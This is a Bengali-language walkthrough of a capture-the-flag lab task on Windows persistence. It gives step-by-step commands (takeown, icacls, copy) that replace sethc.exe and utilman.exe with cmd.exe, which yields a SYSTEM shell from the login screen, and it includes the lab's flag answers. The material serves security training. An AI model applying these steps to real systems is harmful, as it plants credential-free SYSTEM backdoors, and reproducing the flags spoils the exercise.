# 🔓 টাস্ক ৭: লগইন স্ক্রিন / RDP ব্যাকডোরিং (Backdooring the Login Screen / RDP)

## 📌 ভূমিকা ও সাধারণ ধারণা

**ধারণা:** যদি আমাদের ফিজিক্যাল অ্যাক্সেস থাকে অথবা RDP অ্যাক্সেস থাকে, তাহলে আমরা লগইন স্ক্রিনেই ব্যাকডোর বসাতে পারি। এর মাধ্যমে কোনো বৈধ ক্রেডেনশিয়াল ছাড়াই **SYSTEM** লেভেলের টার্মিনাল পাওয়া যায়। এই টাস্কে উইন্ডোজের অ্যাক্সেসিবিলিটি ফিচারগুলোকে কাজে লাগিয়ে দুটি পদ্ধতি দেখানো হয়েছে।

**কেন এটা কাজ করে?**
- লগইন স্ক্রিনে অ্যাক্সেসিবিলিটি ফিচারগুলো **SYSTEM** অ্যাকাউন্টের অধীনে চলে (সর্বোচ্চ সুবিধা)।
- এই ফিচারগুলো ট্রিগার করার জন্য কোনো পাসওয়ার্ড লাগে না।
- ফাইল রিপ্লেস করলে উইন্ডোজ আমাদের বসানো `cmd.exe`-কেই SYSTEM হিসেবে চালায়।

**এই টাস্কে দুইটি পদ্ধতি আলোচনা করা হয়েছে:**
1. **স্টিকি কী (Sticky Keys)** - `sethc.exe` হাইজ্যাক করা
2. **ইউটিলম্যান (Utilman)** - `utilman.exe` হাইজ্যাক করা

---

## ⌨️ পদ্ধতি ১: স্টিকি কী ব্যাকডোর (Sticky Keys - sethc.exe)

### তাত্ত্বিক ব্যাখ্যা
স্টিকি কী হলো একটি অ্যাক্সেসিবিলিটি ফিচার যা `SHIFT` কী পরপর ৫ বার চাপলে অ্যাক্টিভেট হয় এবং `C:\Windows\System32\sethc.exe` চালায়। এই ফাইলটি `cmd.exe` দিয়ে রিপ্লেস করলে লগইন স্ক্রিনে `SHIFT` ৫ বার চাপলেই SYSTEM কমান্ড প্রম্পট পাওয়া যায়।

### ধাপে ধাপে নির্দেশনা

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | `takeown /f C:\Windows\System32\sethc.exe` | TrustedInstaller থেকে ফাইলের মালিকানা নিজের নামে আনা |
| ২ | `icacls C:\Windows\System32\sethc.exe /grant Administrator:F` | নিজের ইউজারকে ফুল কন্ট্রোল পারমিশন দেওয়া |
| ৩ | `copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe` | `cmd.exe` দিয়ে `sethc.exe` ওভাররাইট করা (Yes চাপতে হবে) |
| ৪ | Start Menu → Lock (বা `Windows + L`) | স্ক্রিন লক করা |
| ৫ | লগইন স্ক্রিনে `SHIFT` ৫ বার চাপো | SYSTEM কমান্ড প্রম্পট ওপেন হবে |
| ৬ | `C:\flags\flag14.exe` রান করো | **ফ্ল্যাগ ১৪:** `THM{BREAKING_THROUGH_LOGIN}` |

### কমান্ড একনজরে
```cmd
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```


# ♿ পদ্ধতি ২: ইউটিলম্যান ব্যাকডোর (Utilman - utilman.exe)

## 📌 তাত্ত্বিক ব্যাখ্যা

ইউটিলম্যান হলো উইন্ডোজের ইজ অফ অ্যাক্সেস সেন্টার। লগইন স্ক্রিনের নিচে ডান কোণায় ইজ অফ অ্যাক্সেস আইকনে (ঘড়ির পাশে) ক্লিক করলে `C:\Windows\System32\utilman.exe` চালু হয়। এই ফাইলটি `cmd.exe` দিয়ে রিপ্লেস করলে Ease of Access বাটনে ক্লিক করলেই SYSTEM কমান্ড প্রম্পট পাওয়া যায়।

**কেন এটা কাজ করে?**
- লগইন স্ক্রিনে ইউটিলম্যান **SYSTEM** অ্যাকাউন্টের অধীনে চলে (সর্বোচ্চ সুবিধা)।
- ট্রিগার করার জন্য কোনো পাসওয়ার্ড লাগে না।
- ফাইল রিপ্লেস করলে উইন্ডোজ `cmd.exe`-কেই SYSTEM হিসেবে চালায়।

---

## 📋 ধাপে ধাপে নির্দেশনা

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | **অ্যাডমিনিস্ট্রেটর হিসেবে কমান্ড প্রম্পট খোলা** | Right-click → Run as Administrator |
| ২ | `takeown /f C:\Windows\System32\utilman.exe` | TrustedInstaller থেকে ফাইলের মালিকানা নিজের নামে আনা |
| ৩ | `icacls C:\Windows\System32\utilman.exe /grant Administrator:F` | নিজের ইউজারকে ফুল কন্ট্রোল (F) পারমিশন দেওয়া |
| ৪ | `copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe` | `cmd.exe` দিয়ে `utilman.exe` ওভাররাইট করা |
| ৫ | `Yes` লিখে Enter চাপো | ওভাররাইট কনফার্মেশন |
| ৬ | Start Menu → User Icon → Lock (বা `Windows + L`) | স্ক্রিন লক করা |
| ৭ | লগইন স্ক্রিনে **Ease of Access** আইকনে ক্লিক করো | নিচে ডান কোণায় ঘড়ির পাশের বাটন |
| ৮ | SYSTEM কমান্ড প্রম্পট ওপেন হবে | `whoami` দিলে `nt authority\system` দেখাবে |
| ৯ | `C:\flags\flag15.exe` রান করো | **ফ্ল্যাগ ১৫:** `THM{EASE_OF_ACCESS_FOR_THE_WIN}` |

---

## 💻 কমান্ড একনজরে

```cmd
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```
